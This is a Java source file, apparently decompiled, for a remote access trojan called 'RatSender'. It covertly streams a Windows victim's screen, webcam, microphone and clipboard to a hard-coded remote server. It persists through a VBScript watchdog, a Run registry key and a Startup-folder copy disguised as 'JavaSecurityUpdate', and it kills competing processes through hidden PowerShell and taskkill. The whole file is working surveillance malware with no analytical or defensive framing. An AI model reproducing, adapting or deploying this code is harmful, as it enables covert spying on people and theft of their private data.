package com.example.rat;

import com.example.mic.MicSender;
import com.example.screen.ScreenShareSender;
import com.example.screen.ScreenShareSenderAuto;
import com.example.screen.WebcamShareSender;
import com.sun.jna.platform.win32.Advapi32Util;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.io.RandomAccessFile;
import java.io.StringWriter;
import java.io.UnsupportedEncodingException;
import java.lang.management.ManagementFactory;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.nio.channels.FileLock;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Optional;
import java.util.concurrent.TimeUnit;

public class RatSender {
   static final String ONION_HOST = "5kiwqdzvhip5yjx5u6ms2hsv3yozpslxocjhyf4cyimrg33fcb7devid.onion";
   static final String FALLBACK_HOST = "funrat.mom";
   static final String DEFAULT_KEY = "098cf3c1-2b8c-4094-82c2-388699660f90";
   static final String CLIENT_VERSION = "1.3.0";
   static final String RUN_NAME = "JavaSecurityUpdate";
   static final String LEGACY_RUN_NAME = "javacom";
   static final String RUN_KEY = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
   private static volatile PrintStream FILE_LOG;
   private static volatile String CURRENT_KEY = "098cf3c1-2b8c-4094-82c2-388699660f90";
   private static FileChannel lockChannel;
   private static FileLock lock;

   public static void main(String[] args) throws Exception {
      String key = args.length > 0 && args[0] != null && !args[0].trim().isEmpty() ? args[0].trim() : readSavedKey();
      CURRENT_KEY = key;

      try {
         saveKey(key);
      } catch (Throwable var10) {
      }

      initLog();
      log("==================== RatSender start ====================");
      log("key=" + key);
      log("user=" + System.getProperty("user.name") + " java=" + System.getProperty("java.version") + " os=" + System.getProperty("os.name"));
      log("jar=" + selfJar());
      log("appDir=" + appDir().getAbsolutePath());
      log("[client] build=1.3.0 " + selfStamp() + " admin=" + isElevatedNow() + " helper=" + ScreenShareSenderAuto.helperState());
      if (!acquireSingleInstance()) {
         log("[single] another instance already running -> exit");
         touchHeartbeat();
         System.exit(0);
      } else {
         touchHeartbeat();
         startHeartbeat();
         killStaleWatchers();

         try {
            persistRunKey();
         } catch (Throwable t) {
            log("[persist] crash: " + stack(t));
         }

         cleanupOldWatchers();
         new Thread(() -> ScreenShareSenderAuto.setupAdminOnce(args), "admin-setup").start();
         startTor();
         String hitHost = resolveHost();
         String pollHost0 = ScreenShareSenderAuto.getPollHost();
         String host = pollHost0 == null ? hitHost : pollHost0;
         log("[ws] hits=" + hitHost + " api=" + host);
         String screenWs = "wss://" + host + "/screen-stream";
         String webcamWs = "wss://" + host + "/webcam-stream";
         reportClientVersion(host);
         startUpdatePoll(host);
         startModule("Screen", () -> ScreenShareSender.main(new String[]{key, screenWs}));
         startModule("Webcam", () -> WebcamShareSender.main(new String[]{key, webcamWs}));
         startModule("Mic", () -> MicSender.main(new String[]{key, "-1", host}));
         startModule("Clipboard", () -> ClipboardMonitor.start(key, host));

         while (true) {
            try {
               Thread.sleep(60000L);
            } catch (InterruptedException e) {
               return;
            }
         }
      }
   }

   private static void startModule(final String name, final RatSender.Task body) {
      Thread t = new Thread(() -> {
         long delay = 3000L;

         while (true) {
            try {
               log("[" + name + "] starting");
               body.run();
               log("[" + name + "] returned -> restart in " + delay + "ms");
            } catch (Throwable e) {
               log("[" + name + "] CRASH: " + stack(e));
            }

            try {
               Thread.sleep(delay);
            } catch (InterruptedException ie) {
               return;
            }

            if (delay < 60000L) {
               delay = Math.min(60000L, delay * 2L);
            }
         }
      }, name);
      t.setDaemon(false);
      t.start();
   }

   private static boolean startTor() {
      log("[net] direct, tor skipped");
      return true;
   }

   private static String resolveHost() {
      try {
         String host = ScreenShareSenderAuto.getURL();
         if (host != null && !host.trim().isEmpty()) {
            host = host.trim();
            int scheme = host.indexOf("://");
            if (scheme >= 0) {
               host = host.substring(scheme + 3);
            }

            int slash = host.indexOf(47);
            if (slash >= 0) {
               host = host.substring(0, slash);
            }

            if (!host.isEmpty()) {
               return host;
            }
         }
      } catch (Throwable t) {
         log("[ws] getURL failed: " + stack(t));
      }

      return "funrat.mom";
   }

   private static void reportClientVersion(String host) {
      try {
         URL url = new URL("https://" + host + "/api/client/version?key=" + URLEncoder.encode(CURRENT_KEY, "UTF-8"));
         HttpURLConnection c = (HttpURLConnection)url.openConnection();
         c.setRequestMethod("POST");
         c.setDoOutput(true);
         c.setConnectTimeout(8000);
         c.setReadTimeout(8000);
         c.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
         OutputStream out = c.getOutputStream();

         try {
            out.write("{\"version\":\"1.3.0\"}".getBytes(StandardCharsets.UTF_8));
         } catch (Throwable var7) {
            if (out != null) {
               try {
                  out.close();
               } catch (Throwable var6) {
                  var7.addSuppressed(var6);
               }
            }

            throw var7;
         }

         if (out != null) {
            out.close();
         }

         c.getResponseCode();
         c.disconnect();
      } catch (Exception var8) {
      }
   }

   private static void startUpdatePoll(final String host) {
      String resolved = ScreenShareSenderAuto.getPollHost();
      String pollHost = resolved == null ? host : resolved;
      Thread t = new Thread(() -> {
         int tick = 0;

         while (true) {
            try {
               URL url = new URL("https://" + pollHost + "/api/client/update?key=" + URLEncoder.encode(CURRENT_KEY, "UTF-8"));
               HttpURLConnection c = (HttpURLConnection)url.openConnection();
               c.setConnectTimeout(8000);
               c.setReadTimeout(8000);
               if (c.getResponseCode() == 200) {
                  String body = readAll(c.getInputStream());
                  if (body != null && body.contains("\"update\":true")) {
                     c.disconnect();
                     doSelfUpdate(host);
                     return;
                  }
               }

               c.disconnect();
            } catch (Exception var7) {
            }

            try {
               Thread.sleep(300000L);
            } catch (InterruptedException e) {
               return;
            }

            if (++tick % 6 == 0) {
               reportClientVersion(pollHost);
            }
         }
      }, "UpdatePoll");
      t.setDaemon(true);
      t.start();
   }

   private static void doSelfUpdate(String host) {
      log("[update] disabled: distributed via slot 7");
   }

   private static String selfStamp() {
      try {
         String p = selfJar();
         if (p == null) {
            return "size=? sha=?";
         }

         File f = new File(p);
         MessageDigest md = MessageDigest.getInstance("SHA-256");
         InputStream in = new FileInputStream(f);

         try {
            byte[] buf = new byte[65536];

            int n;
            while ((n = in.read(buf)) != -1) {
               md.update(buf, 0, n);
            }
         } catch (Throwable var7) {
            try {
               in.close();
            } catch (Throwable var6) {
               var7.addSuppressed(var6);
            }

            throw var7;
         }

         in.close();
         StringBuilder var9 = new StringBuilder();
         byte[] var10 = md.digest();

         for (int var11 = 0; var11 < 6; var11++) {
            var9.append(String.format("%02x", var10[var11]));
         }

         return "size=" + f.length() + " sha=" + var9;
      } catch (Throwable t) {
         return "stamp-failed";
      }
   }

   private static String readAll(InputStream in) throws IOException {
      if (in == null) {
         return "";
      }

      ByteArrayOutputStream b = new ByteArrayOutputStream();
      byte[] buf = new byte[8192];

      int n;
      while ((n = in.read(buf)) != -1) {
         b.write(buf, 0, n);
      }

      return new String(b.toByteArray(), StandardCharsets.UTF_8);
   }

   private static boolean acquireSingleInstance() {
      boolean admin = isElevatedNow();

      for (int attempt = 0; attempt < 12; attempt++) {
         try {
            File f = new File(appDir(), "rat-sender.lock");
            lockChannel = new RandomAccessFile(f, "rw").getChannel();
            lock = lockChannel.tryLock();
            if (lock != null) {
               lockChannel.truncate(0L);
               lockChannel.write(ByteBuffer.wrap(("pid=" + selfPid() + "\nadmin=" + (admin ? "1" : "0") + "\n").getBytes(StandardCharsets.UTF_8)));
               writeOwnerFile(selfPid(), admin);
               return true;
            }

            long holder = readLockPid();
            if (!admin || holder <= 0L || holder == selfPid()) {
               return false;
            }

            Runtime.getRuntime().exec(new String[]{"taskkill", "/F", "/PID", String.valueOf(holder)}).waitFor();
            closeLock();
            Thread.sleep(400L);
         } catch (Throwable t) {
            log("[single] lock error: " + stack(t) + " (continuing anyway)");
            return true;
         }
      }

      return false;
   }

   private static long selfPid() {
      try {
         return Long.parseLong(ManagementFactory.getRuntimeMXBean().getName().split("@")[0]);
      } catch (Throwable t) {
         return -1L;
      }
   }

   private static long readLockPid() {
      try {
         File owner = new File(appDir(), "owner.pid");
         if (owner.isFile()) {
            String s = new String(Files.readAllBytes(owner.toPath()), StandardCharsets.UTF_8);

            for (String line : s.split("\n")) {
               if (line.startsWith("pid=")) {
                  long pid = Long.parseLong(line.substring(4).trim());
                  if (pid > 0L && isAlive(pid)) {
                     return pid;
                  }
               }
            }
         }
      } catch (Throwable var9) {
      }

      try {
         String s = new String(Files.readAllBytes(new File(appDir(), "rat-sender.lock").toPath()), StandardCharsets.UTF_8);

         for (String line : s.split("\n")) {
            if (line.startsWith("pid=")) {
               return Long.parseLong(line.substring(4).trim());
            }
         }
      } catch (Throwable var8) {
      }

      return -1L;
   }

   private static void writeOwnerFile(long pid, boolean admin) {
      try {
         writeFile(new File(appDir(), "owner.pid"), "pid=" + pid + "\nadmin=" + (admin ? "1" : "0") + "\n");
      } catch (Throwable var4) {
      }
   }

   private static void touchHeartbeat() {
      try {
         writeFile(new File(appDir(), "client.alive"), String.valueOf(System.currentTimeMillis()));
      } catch (Throwable var1) {
      }
   }

   private static void startHeartbeat() {
      Thread t = new Thread(() -> {
         while (true) {
            touchHeartbeat();

            try {
               Thread.sleep(15000L);
            } catch (InterruptedException e) {
               return;
            }
         }
      }, "heartbeat");
      t.setDaemon(true);
      t.start();
   }

   private static boolean isAlive(long pid) {
      try {
         Optional<ProcessHandle> h = ProcessHandle.of(pid);
         return h.isPresent() && h.get().isAlive();
      } catch (Throwable t) {
         return false;
      }
   }

   private static void closeLock() {
      try {
         if (lock != null) {
            lock.release();
         }
      } catch (Throwable var2) {
      }

      try {
         if (lockChannel != null) {
            lockChannel.close();
         }
      } catch (Throwable var1) {
      }

      lock = null;
      lockChannel = null;
   }

   private static boolean isElevatedNow() {
      try {
         return Advapi32Util.isCurrentProcessElevated();
      } catch (Throwable t) {
         return false;
      }
   }

   private static void persistRunKey() throws Exception {
      String jar = selfJar();
      if (jar == null) {
         log("[persist] no jar path, skip");
      } else {
         File dir = appDir();
         dir.mkdirs();
         String javaw = javaExe("javaw.exe");
         String key = CURRENT_KEY;

         try {
            new File(dir, "rs-super.bat").delete();
         } catch (Throwable var13) {
         }

         try {
            new File(dir, "javacom-super.bat").delete();
         } catch (Throwable var12) {
         }

         try {
            new File(dir, "javacom-super.vbs").delete();
         } catch (Throwable var11) {
         }

         File vbs = new File(dir, "rs-super.vbs");
         String hb = new File(dir, "client.alive").getAbsolutePath();
         String shellCmd = "\"" + javaw + "\" -jar \"" + jar + "\" " + key;
         String vbsBody = "Set s = CreateObject(\"WScript.Shell\")\r\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\r\nhb = \""
            + hb
            + "\"\r\nDo\r\n  fresh = False\r\n  If fso.FileExists(hb) Then\r\n    If DateDiff(\"s\", fso.GetFile(hb).DateLastModified, Now()) < 60 Then fresh = True\r\n  End If\r\n  If Not fresh Then s.Run \""
            + shellCmd.replace("\"", "\"\"")
            + "\", 0, False\r\n  WScript.Sleep 5000\r\nLoop\r\n";
         writeFile(vbs, vbsBody);
         String launcher = "wscript.exe \"" + vbs.getAbsolutePath() + "\"";
         run("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "JavaSecurityUpdate", "/t", "REG_SZ", "/d", launcher, "/f");
         run("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "javacom", "/f");

         try {
            File startupDir = new File(System.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup");
            if (startupDir.isDirectory()) {
               copyFile(vbs, new File(startupDir, "JavaSecurityUpdate.vbs"));
            }
         } catch (Throwable t) {
            log("[persist] startup copy failed: " + t.getMessage());
         }

         log("[persist] registered Run + Startup (JavaSecurityUpdate) -> " + vbs.getAbsolutePath());
      }
   }

   private static void initLog() {
      try {
         File dir = appDir();
         dir.mkdirs();
         File f = new File(dir, "rs.log");
         if (f.exists() && f.length() > 3000000L) {
            File old = new File(dir, "rs.old.log");
            old.delete();
            f.renameTo(old);
         }

         FileOutputStream fos = new FileOutputStream(f, true);
         FILE_LOG = new PrintStream(fos, true, "UTF-8");
         PrintStream origOut = System.out;
         PrintStream origErr = System.err;
         System.setOut(tee(origOut, FILE_LOG));
         System.setErr(tee(origErr, FILE_LOG));
      } catch (Throwable t) {
         try {
            FILE_LOG = System.out;
         } catch (Throwable var5) {
         }
      }
   }

   private static PrintStream tee(final PrintStream a, final PrintStream b) throws UnsupportedEncodingException {
      OutputStream os = new OutputStream() {
         @Override
         public void write(int x) throws IOException {
            if (a != null) {
               a.write(x);
            }

            if (b != null) {
               b.write(x);
            }
         }

         @Override
         public void write(byte[] buf, int off, int len) throws IOException {
            if (a != null) {
               a.write(buf, off, len);
            }

            if (b != null) {
               b.write(buf, off, len);
            }
         }
      };
      return new PrintStream(os, true, "UTF-8");
   }

   private static void log(String m) {
      PrintStream p = FILE_LOG;
      if (p != null) {
         try {
            String ts = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
            p.println("[" + ts + "] " + m);
         } catch (Throwable var3) {
         }
      }
   }

   private static String stack(Throwable t) {
      if (t == null) {
         return "(null)";
      }

      StringWriter sw = new StringWriter();
      t.printStackTrace(new PrintWriter(sw));
      return sw.toString();
   }

   private static File appDir() {
      String base = System.getenv("APPDATA");
      if (base == null || base.trim().isEmpty()) {
         base = System.getProperty("user.home");
      }

      return new File(base, "Microsoft" + File.separator + "SecurityUpdates");
   }

   private static String readSavedKey() {
      try {
         File f = new File(appDir(), "client.key");
         if (!f.isFile()) {
            return "098cf3c1-2b8c-4094-82c2-388699660f90";
         }

         String k = new String(Files.readAllBytes(f.toPath()), StandardCharsets.UTF_8).trim();
         return k.isEmpty() ? "098cf3c1-2b8c-4094-82c2-388699660f90" : k;
      } catch (Throwable t) {
         return "098cf3c1-2b8c-4094-82c2-388699660f90";
      }
   }

   private static void saveKey(String key) throws IOException {
      File dir = appDir();
      if (dir.isDirectory() || dir.mkdirs()) {
         writeFile(new File(dir, "client.key"), key);
      }
   }

   private static void cleanupOldWatchers() {
      try {
         File marker = new File(appDir(), "watchers-cleaned.flag");
         if (marker.isFile()) {
            return;
         }

         ProcessBuilder pb = new ProcessBuilder("wmic", "process", "where", "name='cmd.exe' and commandline like '%watch%.bat%'", "delete");
         pb.redirectErrorStream(true);
         pb.start();
         new File(appDir(), "watchers-cleaned.flag").createNewFile();
      } catch (Throwable var2) {
      }
   }

   private static void killStaleWatchers() {
      try {
         String ps = "Get-CimInstance Win32_Process -Filter \"Name='wscript.exe'\" | Where-Object { $_.CommandLine -like '*Microsoft\\SecurityUpdates*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }; 'ok'";
         ProcessBuilder pb = new ProcessBuilder(
            "powershell.exe", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", ps
         );
         pb.redirectErrorStream(true);
         Process p = pb.start();
         InputStream is = p.getInputStream();

         try {
            byte[] b = new byte[4096];

            while (is.read(b) != -1) {
            }
         } catch (Throwable var7) {
            if (is != null) {
               try {
                  is.close();
               } catch (Throwable var6) {
                  var7.addSuppressed(var6);
               }
            }

            throw var7;
         }

         if (is != null) {
            is.close();
         }

         boolean done = p.waitFor(20L, TimeUnit.SECONDS);
         log("[watch] stale wscript killed done=" + done);
      } catch (Throwable t) {
         log("[watch] kill failed: " + t.getClass().getSimpleName() + ": " + t.getMessage());
      }
   }

   private static String selfJar() {
      try {
         return new File(RatSender.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
      } catch (Throwable t) {
         return null;
      }
   }

   private static String javaExe(String name) {
      String home = System.getProperty("java.home");
      File f = new File(home, "bin" + File.separator + name);
      return f.isFile() ? f.getAbsolutePath() : new File(home, "bin" + File.separator + "java.exe").getAbsolutePath();
   }

   private static void writeFile(File f, String content) throws IOException {
      FileOutputStream fos = new FileOutputStream(f, false);

      try {
         fos.write(content.getBytes(StandardCharsets.UTF_8));
      } finally {
         fos.close();
      }
   }

   private static void copyFile(File src, File dst) throws IOException {
      FileInputStream in = new FileInputStream(src);

      try {
         FileOutputStream out = new FileOutputStream(dst, false);

         try {
            byte[] buf = new byte[8192];

            int n;
            while ((n = in.read(buf)) != -1) {
               out.write(buf, 0, n);
            }
         } finally {
            out.close();
         }
      } finally {
         in.close();
      }
   }

   private static void run(String... cmd) {
      try {
         ProcessBuilder pb = new ProcessBuilder(cmd);
         pb.redirectErrorStream(true);
         Process p = pb.start();
         p.getInputStream().close();
         p.waitFor();
      } catch (Throwable t) {
         log("[run] " + cmd[0] + " failed: " + stack(t));
      }
   }

   private interface Task {
      void run() throws Exception;
   }
}
